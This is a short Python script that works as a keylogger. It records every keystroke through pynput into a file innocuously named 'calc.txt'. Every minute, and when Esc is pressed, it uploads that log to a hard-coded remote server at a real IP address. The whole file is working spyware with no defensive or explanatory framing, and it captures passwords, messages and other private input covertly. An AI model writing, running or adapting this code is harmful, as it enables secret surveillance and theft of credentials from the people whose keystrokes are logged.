import time
import schedule
import requests
from pynput import keyboard
log_file = "calc.txt"
remote_server_ip = "http://109.120.132.158:5000/upload"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

data = {
    "message": "Сработало нажатие esc!",
    "user": "Пользователь"
}

def on_release(key):
    if key == keyboard.Key.esc:
        send_file()
        requests.post(remote_server_ip, json=data)
        return False

def send_file():
    try:
        with open(log_file, "rb") as f:
            files = {'file': f}
            response = requests.post(remote_server_ip, files=files)
            if response.status_code == 200:
                print("1")
            else:
                print(f":2 {response.status_code}")
    except Exception as e:
        print(f"3{e}")

schedule.every(1).minutes.do(send_file)

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def main():
    import threading
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    while True:
        schedule.run_pending()
        time.sleep(1)

if __name__ == "__main__":
    main()